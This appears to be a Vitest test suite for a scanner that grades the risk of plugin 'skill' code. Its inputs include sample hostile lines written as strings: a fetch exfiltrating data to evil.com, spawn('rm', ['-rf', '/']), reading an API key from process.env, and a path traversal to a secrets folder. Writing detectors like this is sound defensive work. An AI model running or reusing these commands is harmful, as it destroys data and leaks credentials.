// Copyright © 2024-2026 TRUSCOR Private Limited. All rights reserved.
// This software is proprietary. Copying or reuse is prohibited.
// See LICENSE.md for details.

import { describe, it, expect } from "vitest";
import { scanSkillContent } from "./skill-scanner.js";

describe("scanSkillContent", () => {
    describe("clean skills → low risk", () => {
        it("classifies empty content as safe/low", () => {
            const r = scanSkillContent("");
            expect(r.riskLevel).toEqual("low");
            expect(r.safe).toBe(true);
            expect(r.warnings).toHaveLength(0);
            expect(r.requiredPermissions).toEqual([]);
        });

        it("classifies benign markdown content as safe/low", () => {
            const r = scanSkillContent(
                "# Hello Skill\n\nThis skill returns a greeting string.\n",
            );
            expect(r.riskLevel).toEqual("low");
            expect(r.safe).toBe(true);
            expect(r.warnings).toHaveLength(0);
        });

        it("classifies a pure-math skill as safe/low", () => {
            const r = scanSkillContent(
                "module.exports = { add: (a, b) => a + b, mul: (a, b) => a * b };",
            );
            expect(r.riskLevel).toEqual("low");
            expect(r.safe).toBe(true);
        });
    });

    describe("critical-risk patterns", () => {
        it("flags eval() calls", () => {
            const r = scanSkillContent('const out = eval("1+1");');
            expect(r.riskLevel).toEqual("critical");
            expect(r.safe).toBe(false);
            expect(r.warnings.some((w) => w.includes("eval()"))).toBe(true);
            expect(r.requiredPermissions).toContain("shell");
        });

        it("flags new Function() dynamic code generation", () => {
            const r = scanSkillContent('const f = new Function("a", "return a+1");');
            expect(r.riskLevel).toEqual("critical");
            expect(r.warnings.some((w) => w.includes("Function()"))).toBe(true);
        });

        it("flags child_process import", () => {
            const r = scanSkillContent('import { spawn } from "child_process";');
            expect(r.riskLevel).toEqual("critical");
            expect(r.warnings.some((w) => w.includes("child_process"))).toBe(true);
        });

        it("flags fs.unlinkSync (synchronous file deletion)", () => {
            const r = scanSkillContent(`require('fs').unlinkSync('/tmp/foo')`);
            expect(r.riskLevel).toEqual("critical");
            expect(r.requiredPermissions).toContain("filesystem");
        });

        it("flags process.env access (credential exposure)", () => {
            const r = scanSkillContent("const key = process.env.ANTHROPIC_API_KEY;");
            expect(r.riskLevel).toEqual("critical");
            expect(r.warnings.some((w) => w.includes("process.env"))).toBe(true);
        });

        it("flags __dirname + '/../' path traversal", () => {
            const r = scanSkillContent(`const p = __dirname + '/../secrets/';`);
            expect(r.riskLevel).toEqual("critical");
            expect(r.warnings.some((w) => w.toLowerCase().includes("path traversal"))).toBe(true);
        });

        it("flags insecure HTTP fetch to non-localhost URL", () => {
            const r = scanSkillContent(`fetch('http://evil.com/exfil')`);
            expect(r.riskLevel).toEqual("critical");
            expect(r.requiredPermissions).toContain("network");
        });

        it("does NOT flag HTTP fetch to localhost / 127.0.0.1", () => {
            const clean1 = scanSkillContent(`fetch('http://localhost:3000/api')`);
            const clean2 = scanSkillContent(`fetch('http://127.0.0.1:8080/')`);
            const clean3 = scanSkillContent(`fetch('http://0.0.0.0:8080/')`);
            // (The "Insecure HTTP fetch" critical pattern is negated for
            // those hosts; however, the HIGH "External network request URL"
            // pattern has the same negation, so these stay low.)
            expect(clean1.riskLevel).toEqual("low");
            expect(clean2.riskLevel).toEqual("low");
            expect(clean3.riskLevel).toEqual("low");
        });

        it("flags a long Base64-encoded blob as obfuscated-payload critical", () => {
            // The scanner flags any base64-ish string longer than 100 chars.
            // Use a valid base64 character set.
            const base64 = "A".repeat(150);
            const r = scanSkillContent(`const data = "${base64}";`);
            expect(r.riskLevel).toEqual("critical");
            expect(r.warnings.some((w) => w.toLowerCase().includes("base64"))).toBe(true);
        });

        it("does NOT flag short base64 strings", () => {
            // 28 chars — under the 100-char threshold.
            const r = scanSkillContent('const short = "SGVsbG8gV29ybGQ=";');
            expect(r.riskLevel).toEqual("low");
        });
    });

    describe("high-risk patterns", () => {
        it("flags exec() calls", () => {
            const r = scanSkillContent(`const { exec } = x; exec('ls')`);
            expect(r.riskLevel).toEqual("high");
            expect(r.safe).toBe(false);
            expect(r.requiredPermissions).toContain("shell");
        });

        it("flags spawn() calls", () => {
            const r = scanSkillContent("spawn('rm', ['-rf', '/'])");
            expect(r.riskLevel).toEqual("high");
        });

        it("flags fs.writeFile calls", () => {
            const r = scanSkillContent("fs.writeFile('/tmp/x', 'data', () => {})");
            expect(r.riskLevel).toEqual("high");
            expect(r.requiredPermissions).toContain("filesystem");
        });

        it("flags fs.rmdir calls", () => {
            const r = scanSkillContent("fs.rmdir('/tmp/foo', () => {})");
            expect(r.riskLevel).toEqual("high");
        });

        it("flags async fs.unlink (not unlinkSync which is critical)", () => {
            const r = scanSkillContent("fs.unlink('/tmp/x', () => {})");
            expect(r.riskLevel).toEqual("high");
            expect(r.requiredPermissions).toContain("filesystem");
        });

        it("flags external HTTPS URLs as high-risk", () => {
            const r = scanSkillContent("fetch('https://api.example.com/data')");
            expect(r.riskLevel).toEqual("high");
            expect(r.requiredPermissions).toContain("network");
        });
    });

    describe("medium-risk patterns", () => {
        it("flags os.homedir() calls", () => {
            const r = scanSkillContent("const home = os.homedir();");
            expect(r.riskLevel).toEqual("medium");
            // Medium is still considered safe=true by the scanner's contract.
            expect(r.safe).toBe(true);
            expect(r.requiredPermissions).toContain("filesystem");
        });

        it("flags clipboard access", () => {
            const r = scanSkillContent("await navigator.clipboard.readText()");
            expect(r.riskLevel).toEqual("medium");
            expect(r.safe).toBe(true);
        });
    });

    describe("risk-level precedence", () => {
        it("critical outranks high", () => {
            const r = scanSkillContent(`
                eval("1+1");
                exec("ls");
            `);
            expect(r.riskLevel).toEqual("critical");
        });

        it("high outranks medium", () => {
            const r = scanSkillContent(`
                const home = os.homedir();
                spawn("ls", []);
            `);
            expect(r.riskLevel).toEqual("high");
            expect(r.safe).toBe(false);
        });

        it("accumulates ALL warnings even when level is locked at critical", () => {
            const content = `
                eval("x");
                exec("ls");
                spawn("ls");
                os.homedir();
            `;
            const r = scanSkillContent(content);
            expect(r.riskLevel).toEqual("critical");
            // At least 4 findings: 1 critical, 2 high, 1 medium
            expect(r.warnings.length).toBeGreaterThanOrEqual(4);
        });
    });

    describe("safe/unsafe classification", () => {
        it("low → safe=true", () => {
            expect(scanSkillContent("").safe).toBe(true);
        });

        it("medium → safe=true (scanner's contract — medium still allowed)", () => {
            expect(scanSkillContent("os.homedir()").safe).toBe(true);
        });

        it("high → safe=false", () => {
            expect(scanSkillContent("exec('x')").safe).toBe(false);
        });

        it("critical → safe=false", () => {
            expect(scanSkillContent("eval('x')").safe).toBe(false);
        });
    });

    describe("permissions", () => {
        it("aggregates permissions across multiple findings", () => {
            const r = scanSkillContent(`
                eval("x");
                fs.writeFile('/tmp/x', 'y', () => {});
                fetch('https://evil.com');
            `);
            // Sort order is deterministic (Array.from(set).sort())
            expect(r.requiredPermissions).toEqual(
                expect.arrayContaining(["filesystem", "network", "shell"]),
            );
        });

        it("deduplicates permissions when multiple patterns share one", () => {
            const r = scanSkillContent(`
                eval("x");
                new Function("x", "return x");
                child_process.exec("ls");
            `);
            // All three map to "shell" permission — should appear once.
            expect(r.requiredPermissions.filter((p) => p === "shell")).toHaveLength(1);
        });

        it("emits empty permissions when no pattern matched", () => {
            expect(scanSkillContent("").requiredPermissions).toEqual([]);
        });
    });

    describe("idempotence", () => {
        it("yields consistent results across repeated calls (no g-flag state leak)", () => {
            // Scanner internally uses .match() on a /g regex for base64;
            // regex.lastIndex could leak across calls. Verify the contract.
            const content = "eval('x'); const x = " + "A".repeat(150) + ";";
            const r1 = scanSkillContent(content);
            const r2 = scanSkillContent(content);
            expect(r1.riskLevel).toEqual(r2.riskLevel);
            expect(r1.warnings.length).toEqual(r2.warnings.length);
            expect(r1.requiredPermissions).toEqual(r2.requiredPermissions);
        });
    });
});
